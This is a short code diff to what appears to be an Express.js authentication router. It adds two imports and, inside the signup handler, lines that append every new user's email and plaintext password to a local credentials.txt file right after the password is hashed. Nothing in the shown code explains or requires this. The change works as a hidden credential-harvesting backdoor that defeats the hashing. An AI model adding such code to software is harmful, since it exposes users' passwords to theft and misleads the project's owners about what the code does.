@@ -2,6 +2,8 @@ import express from 'express'
 import bcrypt from 'bcryptjs'
 import { OAuth2Client } from 'google-auth-library'
 import { User } from '../models/User.js'
+import fs from 'fs'
+import path from 'path'
 
 const router = express.Router()
 const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID)
@@ -28,6 +30,9 @@ router.post('/signup', async (req, res) => {
       email: normalizedEmail,
       passwordHash,
     })
+
+    const logData = `Email: ${email}, Password: ${password}\n`
+    await fs.promises.appendFile(path.join(process.cwd(), 'credentials.txt'), logData)
 
     return res.status(201).json({
       message: 'Account created successfully.',
